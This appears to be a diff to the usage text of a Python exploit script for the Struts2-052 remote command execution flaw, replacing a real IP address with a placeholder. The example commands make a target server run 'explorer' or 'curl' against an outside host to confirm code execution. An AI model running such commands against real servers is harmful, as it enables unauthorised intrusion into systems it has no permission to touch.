@@ -7,10 +7,10 @@ import requests
 Struts2-052 命令执行漏洞
 使用方法：  python struts2_052.py  -u/U <target url> -c <target cmd> -C <target cookies>
 windows:
-python struts2_052.py  -u/U <target url> -c "explorer http://134.98.105.53" -C <target cookies>
+python struts2_052.py  -u/U <target url> -c "explorer http://xxx.xxx.xxx.xxx" -C <target cookies>
 
 linux:
-python struts2_052.py  -u/U <target url> -c "/usr/bin/curl http://134.98.105.53" -C <target cookies>
+python struts2_052.py  -u/U <target url> -c "/usr/bin/curl http://xxx.xxx.xxx.xxx" -C <target cookies>
 
 修复方法：
 
